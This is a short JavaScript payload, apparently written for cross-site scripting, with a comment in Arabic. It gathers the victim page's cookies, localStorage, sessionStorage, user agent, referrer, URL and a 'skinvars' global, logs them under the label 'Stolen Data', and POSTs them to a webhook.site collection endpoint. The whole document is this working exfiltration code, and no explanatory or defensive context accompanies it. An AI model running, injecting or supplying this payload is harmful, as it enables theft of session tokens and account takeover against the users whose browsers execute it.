(async () => {
  const data = {
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    userAgent: navigator.userAgent,
    referrer: document.referrer,
    location: location.href,
    skinvars: window.skinvars
  };

  console.log("🔥 Stolen Data:", data);

  // إرسال البيانات إلى Webhook
  fetch("https://bab6baf9-25da-4e4a-8c5c-6bbb9c589995.webhook.site/cookie", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(data)
  });
})();
